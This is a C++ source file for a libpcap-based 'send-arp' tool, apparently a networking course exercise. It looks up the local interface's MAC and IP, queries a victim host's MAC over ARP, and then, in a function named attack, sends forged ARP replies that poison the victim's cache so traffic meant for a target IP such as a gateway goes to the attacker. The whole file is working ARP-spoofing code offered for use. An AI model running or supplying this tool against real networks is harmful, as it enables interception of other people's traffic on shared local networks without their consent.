#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

void get_attacker_info(char *dev, Mac *mac, Ip *ip);
Mac get_sender_info(Mac eth_smac, Ip arp_sip, Ip arp_tip, pcap_t *handle);
void attack(Mac eth_dmac, Mac eth_smac, Ip arp_sip, Ip arp_tip, pcap_t *handle);

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

#pragma pack(pop)

EthArpPacket packet;

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc <= 3) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	Mac attacker_mac, sender_mac, target_mac;
	Ip attacker_ip, sender_ip, target_ip;
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	sender_ip = Ip(std::string(argv[2]));
	target_ip = Ip(std::string(argv[3]));
	get_attacker_info(dev, &attacker_mac, &attacker_ip);
	sender_mac = get_sender_info(attacker_mac, attacker_ip, sender_ip, handle);
	attack(sender_mac, attacker_mac, target_ip, sender_ip, handle);
	
	pcap_close(handle);
}

void get_attacker_info(char *dev, Mac *mac, Ip *ip)
{
	int fd;
	struct ifreq ifr;
	const char *iface = dev;
	memset(&ifr, 0, sizeof(ifr));

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

	if (0 == ioctl(fd, SIOCGIFHWADDR, &ifr))
		*mac = Mac((uint8_t *)ifr.ifr_hwaddr.sa_data);
	if (0 == ioctl(fd, SIOCGIFADDR, &ifr))
		*ip = Ip(std::string(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr)));
	close(fd);
	return;
}

Mac get_sender_info(Mac eth_smac, Ip arp_sip, Ip arp_tip, pcap_t *handle)
{
	packet.eth_.dmac_ = Mac::broadcastMac();;
	packet.eth_.smac_ = eth_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = eth_smac;
	packet.arp_.sip_ = htonl(arp_sip);
	packet.arp_.tmac_ = Mac::nullMac();
	packet.arp_.tip_ = htonl(arp_tip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	while(1) {
		struct pcap_pkthdr *header;
		const u_char *reply_packet;
		int res = pcap_next_ex(handle, &header, &reply_packet);
		EthArpPacket *receive_packet = (EthArpPacket *)reply_packet;
		if (receive_packet->arp_.sip() == arp_tip )
			return receive_packet->arp_.smac_;
	}
}

void attack(Mac eth_dmac, Mac eth_smac, Ip arp_sip, Ip arp_tip, pcap_t *handle)
{
	packet.eth_.dmac_ = eth_dmac;
	packet.eth_.smac_ = eth_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = eth_smac;
	packet.arp_.sip_ = htonl(arp_sip);
	packet.arp_.tmac_ = eth_dmac;
	packet.arp_.tip_ = htonl(arp_tip);

	for (int i = 0; i < 10; i++)
	{
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			return ;
		}
	}
}